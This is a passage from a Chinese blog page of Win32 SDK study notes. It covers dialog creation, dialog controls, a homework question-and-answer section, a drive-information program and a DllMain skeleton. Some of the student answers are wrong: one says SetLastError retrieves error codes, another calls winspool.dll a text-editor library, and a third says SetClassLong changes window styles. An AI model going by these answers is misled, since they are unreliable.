class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h2 id="对话框资源"><a href="#对话框资源" class="headerlink" title="对话框资源"></a>对话框资源</h2><p>可视化编程</p><ul><li>DialogBox 模态对话框 会阻塞住父窗口</li><li>CreateDialog 非模态对话框 不会阻塞父窗口</li></ul><h3 id="模态对话框"><a href="#模态对话框" class="headerlink" title="模态对话框"></a>模态对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">DialogBox</span>(</span><br><span class="line">hInstance,</span><br><span class="line"><span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非模态对话框"><a href="#非模态对话框" class="headerlink" title="非模态对话框"></a>非模态对话框</h3><p>CreateDialog</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hDlg = <span class="built_in">CreateDialog</span>(</span><br><span class="line">hInstance,</span><br><span class="line"><span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="comment">//显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hDlg, SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="comment">// 消息循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(</span><br><span class="line">&amp;msg, <span class="comment">//获取到消息的结构体</span></span><br><span class="line"><span class="number">0</span>,    <span class="comment">//获取哪一个窗口的消息，为0就是所有窗口</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//   5.2翻译消息</span></span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="comment">//   5.3转发到消息回调函数</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对话框控件的使用"><a href="#对话框控件的使用" class="headerlink" title="对话框控件的使用"></a>对话框控件的使用</h2><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><p>有一个重要操作，需要记住：分组</p><p>ctrl+D之后将同一组的radio都编为连续的序号。</p><p>将每组的第一个radio设置group为true</p><h3 id="静态文本"><a href="#静态文本" class="headerlink" title="静态文本"></a>静态文本</h3><p>一个提示语直接拖拽即可</p><h3 id="静态图片"><a href="#静态图片" class="headerlink" title="静态图片"></a>静态图片</h3><p>能够显示一个bitmap的图片</p><p>需要一个picture的控件，然后去设置两个属性</p><p>一个bmp格式的图片资源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h1 id="四、SDK问题"><a href="#四、SDK问题" class="headerlink" title="四、SDK问题"></a>四、SDK问题</h1><h2 id="问答1"><a href="#问答1" class="headerlink" title="问答1"></a>问答1</h2><p>1、什么是windows 错误码?应该在什么时候获取? 使用什么函数获取? 获取到之后如何<br>查看其所代表的内容?<br>答：windows 错误码是不同的API有不同类型的错误返回值，在API结束之后获取，可以使用SetLastError函数获取，使用错误查找工具或者在VS监视栏中输入“err,hr”查看。<br>2、如何为自己的函数定义windows 错误码，使用哪一个函数?<br>答：SetLastError函数。<br>3、在Virtual Stodio 中，在监视栏中输入什么字符，能够方便的查看错误码?<br>答：err,hr字符。<br>4、什么是句柄? 几个字节? 有什么用?<br>答：在程序设计中，句柄是一种特殊的智能指针。当一个应用程序要引用其他系统（如数据库、操作系统）所管理的内存块或对象时，就要使用句柄。在windows编程中，一个句柄是指使用的一个唯一的整数值，即一个4字节(64位程序中为8字节)长的数值，来标识应用程序中的不同对象和同类中的不同的实例，诸如，一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。<br>5、什么是实例? WinMain 函数的四个参数分别代表什么意思?<br>答：实例诸如一个窗口，按钮，图标，滚动条等，hInstance是程序实例的句柄，它是程序的加载地址，hPrevInstance这个参数已经废弃，IpCmdLine是由调用者传入的命令，nCmdShow是由调用者传入的int型参数。<br>6、请问TCHAR,_tcslen 本质是什么?由谁控制? 使用通用字符需要包含什么头文件?<br>答：T版的数据或者函数，本质上还是ascii编码或者unicode的编码，主要靠#indefine和typedef实现的，它只由编译环境自动选择，tchar.h头文件。<br>7、窗口回调函数的原型是什么?<br>答：原型如下：<br>LRESULT CALLBACK WindowProc(<br>HWND hwnd, //窗口句柄<br>UINT uMsg, //消息ID<br>WPARAM wParam, //消息参数1<br>LPARAM lParam //消息参数2<br>);<br>8、使用SPY++查看QQ 登录框类名是什么? 聊天窗口类名是什么?<br>答： TXGuiFoundation TXGuiFoundation<br>9、窗口类结构体中hbrBackground 有什么用? 请尽量详细的说明。<br>答：hbrBackground 可以刷新背景所用的画刷的句柄。Windows定义六种现有画刷：WHITE_BRUSH、LTGRAY_BRUSH、GRAY_BRUSH、DKGRAY_BRUSH、BLACK_BRUSH和NULL_BRUSH （也叫HOLLOW_BRUSH）。您可以将任何一种现有画刷选入您的装置内容中，就和您选择一种画笔一样。Windbws将HBRUSH定义为画刷的代号，所以可以先定义一个画刷代号变数：<br>HBRUSH hBrush ;<br>您可以通过呼叫GetStockObject来取得GRAY_BRUSH的代号：<br>hBrush = GetStockObject (GRAY_BRUSH) ;<br>wndclass.hbrBackground = (HBRUSH) GetStockObject (GRAY_BRUSH);//设置窗口背景画刷的句柄</p><p>10、什么是队列消息? 什么是非队列消息? 请各举出三个例子。<br>答：队列消息包括系统和线程的消息队列，队列送到系统消息队列，然后送到线程消息队列，而非队列消息是直接送给目的窗口的过程。队列消息如WM_MOUSERMOVE,WM_CHAR,WM_PAINT。非队列消息有WM_ACTIVATE,应用系统发送WM_WINDOWPOSCHANGED，SendMessage函数也会发送非队列消息。</p><p>11、PostMessage 和SendMessage 有什么区别?<br>答：PostMessage只是把消息放入队列，不管其他程序是否处理都返回，然后继续执行；而SendMessage必须等待其他程序处理消息后才返回，继续执行。PostMessage的返回值表示PostMessage函数执行是否正确；而SendMessage的返回值表示其他程序处理消息后的返回值。 PostMessage会造成消息的滞后性,而SendMessage则不会,但如果SendMessage消息处理失败,则会造成程序停止。</p><p>12、下面这个结构体是窗口类结构体，请分别说明，各个字段是什么含义。<br>答：各字段含义见注释。<br>typedef struct tagWNDCLASSW {<br>UINT style;//窗口类的风格（无符号32位整数）<br>WNDPROC lpfnWndProc;//指向窗口过程的指针<br>int cbClsExtra;//分派给窗口类的扩展的字节数<br>int cbWndExtra;//分派给窗口实例的扩展的字节数<br>HINSTANCE hInstance;.//实例句柄<br>HICON hIcon;//类图标的句柄<br>HCURSOR hCursor;//类鼠标指针的句柄<br>HBRUSH hbrBackground;//刷新背景所用的画刷的句柄<br>LPCWSTR lpszMenuName;//窗口类包含的菜单的名称<br>LPCWSTR lpszClassName;//窗口类名<br>}<br>WNDCLASSW</p><p>13、以下消息分别在什么时候触发<br>WM_LBUTTONDOWN 点击鼠标左键<br>WM_PAINT 绘制对象时<br>WM_CLOSE 点击关闭程序按钮</p><p>==================</p><p>1、窗口风格有三大风格，分别是什么? 各有什么特点?<br>答：窗口三大风格是重叠窗口(Overlapped Window)，弹出窗口(Popup Window)，子窗口(Child Window)，重叠窗口是顶级窗口，是缺省类型，它有边框，标题栏，客户区等，还有其他组件；弹出窗口也是顶级窗口，通常用于对话框或者Message对话框，它具有WS_POPUP窗口风格，隐含带有WS_CLIPSIBLINGS窗口风格。</p><p>2、WM_COMMAND 作为控件的通知消息，wParam 与lParam 分别有什么含义?<br>答：wParam是指32位的消息参数，是一个消息有关的常量值，也可能是窗口或控件的句柄， lParam 也是指32位的消息参数，通常是一个指向内存中数据的指针。</p><p>3、什么是模态对话框? 什么是非模态对话框? 用什么创建?，<br>答：模态对话框创建后一定要在用户关闭对话框后，其父窗口才能响应用户操作，否则父窗口便无法响应任何用户的操作，模态对话框函数自带消息循环；非模态对话框则是创建完后其父窗口不需要像模态窗口那样等到对话框关闭才能响应用户的操作，一样可以在对话框未关闭前响应用户操作，非模态对话框函数需要自己写消息循环。模态对话框使用DialogBox创建，非模态对话框使用CreateDialog完成。</p><p>4、控件既可以用代码创建，也可以在对话框资源上拖拽，创建控件的函数是什么?。<br>答：创建控件的函数是CreateWindow。</p><p>5、WM_NOTIFY 和WM_COMMAND 的区别。<br>答：WM_COMMAND和WM_NOTIFY都是控件通知消息，WM_NOTIFY和WM_COMMAND相比，是一种更灵活的消息格式，lParam中放的是一个称为NMHDR结构的指针。在wParam中放的则是控件的ID。最初Windows 3.x就有的控件，如Edit，Combo，List，Button等，发送的控件通知消息的格式是WM_COMMAND；而后期的Win32通用控件，如List View，Image List，IP Address，Tree View，Toolbar等，发送的都是WM_NOTIFY控件通知消息。</p><p>6、使用通用(扩展)控件的准备工作都有哪些？<br>答：在15版本以下的VS使用通用控件需要先包含<CommCtrl.h>,引入 #pragma comment(lib,”comct132.lib”)，调用InitCommonControls初始化通用控件，使用CreateWindowEx函数创建通用控件。</CommCtrl.h></p><p>==================<br>1、什么是API? 什么是动态链接库? 写出常见的动态链接库及其大体功能。<br>答：API是指API（Application Programming Interface，应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组历程的能力，而又无需访问源码，或理解内部工作机制的细节。<br>动态链接库的英文名称叫DynamicLinkableLibrary，它是microsoft在windows操作系统中实现共享函数库概念的一种实现方式。大多数与windows相关的磁盘文件如果不是程序模块，就是动态链接程序。<br>常见的动态链接库及其大体功能：<br>kernel32.dll Windows9x/Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理<br>user32.dll Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。<br>gdi32.dll Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字<br>winspool.dll 一款文本编辑软件的库文件<br>comdlg32.dll Windows应用程序公用对话框模块，用于例如打开文件对话框</p><p>都包括什么?<br>2、你所知道的文件操作<br>答：文件操作包括新建打开文件CreateFile，删除指定文件DeleteFile，复制文件CopyFile，ReadFile读取文件，WriteFile写文件，GetFileAttribute获取文件属性，SetFileAttribute设置文件或目录的属性。</p><p>3、什么是进程? 什么是线程?<br>答：进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元，同一个进程中可以包括多个线程，并且线程共享整个进程的资源（寄存器、堆栈、上下文），一个进程至少包括一个线程。</p><p>4、Dll 可以导出什么?<br>答：Dll可以导出类和函数。</p><p>5、在编写dll 时，当我们想要导出一个东西时，有哪些方式? 分别如何实现?<br>答：一、可以使用_declspec(dllexport)，在函数声明前加_declspec(dllexport)。二、使用模块定义文件（扩展名为.def）导出，文件里面写<br>LIBRARY<br>DESCRIPTION “DLL”<br>EXPORTS<br>函数名</p><p>6、我们使用dll 的时候，通常有两种方式。分别如何实现?<br>答：见上一题。</p><p>7、什么叫做对象库? 什么叫做导入库?<br>答;对象库是一个扩展名为.LIB的文件，在这个文件的代码在运行链接器进行静态链接时被添加到程序的.EXE文件中。导入库是一种特殊的形式的对象库文件，后缀名和对象库一样，链接器用它来解析源代码中的函数调用。但是导入库不包含任何代码，它们只给链接器提供信息来建立EXE文件中用于动态链接的重定位表格。</p><p>8、什么叫做名称粉碎? 有什么用处?<br>答：名称粉碎是函数名称相同的函数在C中出现重定义，然而在C++中用于函数重载，相同的名称会粉碎成不同的函数内存地址，从而区别调用的是什么函数，由此可以实现多态。</p><h2 id="问答2"><a href="#问答2" class="headerlink" title="问答2"></a>问答2</h2><ol><li><p>怎么将”123”转换成123? 反过来呢?</p><p>使用sscanf_s函数将字符转换位数字，宽版使用stscanf_s</p><p>反过来就是先转换为数字后，反向遍历</p><p>（老师批注：stscanf_s是通用版本，根据项目默认编码方式自动匹配，wsprintf是宽版，用到通用版本才需要tchar，单纯用宽版函数是不需要tchar.h的）</p></li><li><p>“哈哈”和L”哈哈”一样吗? 哪里不一样? 怎么转换?</p><p>答：不一样，窄版和宽版，如果需要使用宽板只需在字符前加上L即可，但需包含头文件tchar.h</p></li><li><p>创建窗口的流程是什么?</p><p>1,使用WNDCLASS结构体定义窗口</p><p>2，将定义的窗口注册</p><p>3，将注册的窗口创建出来</p><p>4，更新并显示窗口</p><p>5，创建消息循环</p><p>6，回调</p></li><li><p>怎么响应窗口消息?</p><p>答：不同的消息有不同的响应方式，例如：当窗口创建的时候会产生WM_CREATE消息，点击按钮（button）时会产生WM_COMMAND消息，</p></li><li><p>wParam和lParam保存了什么信息?</p><p>答：如在响应WM_COMMAND消息时WPARAM的高位是通知码，低位是ID，LPARAM保存的是句柄</p></li><li><p>怎么响应控件的单击消息?</p><p>答：单击控件时会产生WM_COMMAND消息，在这个消息中他的WPARAM的低位是被单机控件的ID，把这个ID找出来后，通过这个ID使用GetDlgItem这个函数获取该控件的句柄从而进行想要的消息响应</p></li><li><p>如何创建单选框?</p><p>在工具栏中拖拽，然后通过WPARAM的低位ID响应，然后通过WPARAM的高位通知码获取单选框是否被点击</p></li><li><p>怎么将单选框设置为选中状态?</p><p>答：给单选框发送一个SendMessage消息第二参数BM_SETCHECK第三个参数就是设置选中的状态码1</p></li><li><p>如何获取复选框是否被选中?</p><p>使用BM_GETCHECK参数给复选框发送SendMessage消息，用BOOL值接收</p></li><li><p>如何给窗口添加主菜单?</p><p>答：资源创建，通过ID获取句柄，创建窗口时加上这个句柄</p></li><li><p>怎么在程序中加载图片资源?</p><p>答：</p><p>//加载图片</p><p>HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</p><p>//获取图片框资源句柄</p><p>HWND hPic=GetDlgItem(hMain, IDC_STATIC1);</p><p>//设置图片</p><p>SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</p></li><li><p>怎么在窗口中弹出右键菜单</p><p>在WM_RBUTTONDOWN消息中响应右击，在这个消息中获取右击的坐标，使用这个坐标弹出窗口（TrackPopupMeun）</p></li><li><p>怎么设置和获取编辑框的文本</p><p>获取编辑框句柄GetDlgItem</p><p>创建接收文本的缓冲区WCHAR 数组</p><p>获取编辑款文本GetWindowText</p></li><li><p>下拉框怎么添加文本?</p><p>获取句柄在使用ComboBox_AddString函数添加文本</p></li><li><p>怎么结束一个对话框?</p><p>EndDiaLog</p></li><li><p>怎么获取或修改窗口的窗口风格?</p><p>获取需要修改控件的句柄，然后使用SetClassLong修改</p></li><li><p>怎么替换一个控件的消息回调函数?</p><p> 控件句柄 修改的属性 回调函数</p><p>SetWindowLong(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</p></li><li><p>怎么创建DLL工程?</p><p>在新建的时候选择dll，</p></li><li><p>怎么导出函数?</p><p>两种导出方法</p><p>在头文件中声明导出_declspec(dllexport)</p><p>模块定义导出，添加一个def文件，在文件中写入EXPORTS（后跟需要导出的函数，且函数后标号）</p><p>之后再属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p></li><li><p>怎么调用从DLL导出的函数?</p><p>两种调用方式</p><p>隐式调用</p><p>包含头文件，头文件中含有导出函数的声明。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">载入lib文件  #pragma  comment（lib,“”）;</span><br><span class="line">直接调用函数即可</span><br></pre></td></tr></table></figure><p>显示调用</p><p>使用LoadLibrary（）将目标dll强行加载到进程中。<br>在 GetProcAddress()获得函数的地址。然后使用返回的函数指针调用</p><p>（老师批注：dll显式链接方式不要忘了FreeLibrary）</p></li><li><p>怎么调试DLL</p><p>（老师批注：可以通过编写调用dll函数的程序进行调试）</p></li><li><p>exe加载DLL时(使用相对路径),被加载的DLL可以放在任何目录吗,如果不能,那么都能放到哪些目录?</p><p>只能放在相对exe的相对路径中</p></li><li><p>怎么使用静态库? 和动态库相比有和区别?</p><p>使用方法是一样的，只是使用静态库编译后的程序会比动态库的程序占用空间大，因为静态库是直接把库文件载入到了程序中，而不是需要从外部调用</p></li></ol><h1 id="五、磁盘信息"><a href="#五、磁盘信息" class="headerlink" title="五、磁盘信息"></a>五、磁盘信息</h1><h2 id="获取盘符的字符串，"><a href="#获取盘符的字符串，" class="headerlink" title="获取盘符的字符串，"></a>获取盘符的字符串，</h2><p>GetLogicalDriveStrings( 100,buf);</p><p>// 把语言设置为中文</p><p>setlocale(LC_ALL, “chs”);</p><h2 id="获取驱动器类型"><a href="#获取驱动器类型" class="headerlink" title="获取驱动器类型"></a>获取驱动器类型</h2><p>，由于这里需要的是一个指针，所以需要在定义一个TCHAR*指针类型指向数组（缓冲区）</p><p>用整形接收返回值，</p><p> 2，代表可移动设备 DRIVE_REMOVABLE</p><p> 3，硬盘 DRIVE_FIXED</p><p> 4，远程设备DRIVE_REMOTE</p><p> 5，光驱 DRIVE_CDROM</p><p>GetDriveType(pTemp);</p><h2 id="计算磁盘空间"><a href="#计算磁盘空间" class="headerlink" title="计算磁盘空间"></a>计算磁盘空间</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,<span class="comment">//盘符</span></span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量 </span><br></pre></td></tr></table></figure><h2 id="查看磁盘的实例代码"><a href="#查看磁盘的实例代码" class="headerlink" title="查看磁盘的实例代码"></a>查看磁盘的实例代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_获取磁盘信息.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"><span class="built_in">GetLogicalDriveStrings</span>( <span class="number">100</span>,buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;%s  &quot;</span>), pTemp);</span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = <span class="built_in">GetDriveType</span>(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;可移动设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;硬盘 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;远程设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="built_in">wprintf</span>(_T(<span class="string">&quot;光驱 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetDiskFreeSpace</span>(pTemp,</span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;总容量为%.2lf,空闲容量为%.2lf&quot;</span>,</span><br><span class="line">(((全部簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量)/<span class="number">1024</span>)/<span class="number">1024</span>,</span><br><span class="line">(((空闲簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pTemp += <span class="built_in">wcslen</span>(buf)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*wcslen遇到0会被截断，缓冲区存储的时“C:\0D:\”,所以wcslen(buf)的长度等于3，pTemp+=wcslen(buf)+1之后就是下一个盘符的开始*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="六、动态链接库"><a href="#六、动态链接库" class="headerlink" title="六、动态链接库"></a>六、动态链接库</h1><p>定义 DLL 应用程序的入口点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="comment">//dll文件是给他人提供函数所用，不会作为一个程序单独运行，也就没有第一行执行代码的概念</span></span><br><span class="line"><span class="comment">//通常不需要理会DllMain，不会再里面写什么代码</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:  <span class="comment">//线程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:  <span class="comment">//线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:  <span class="comment">//进程卸载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="声明导出"><a href="#声明导出" class="headerlink" 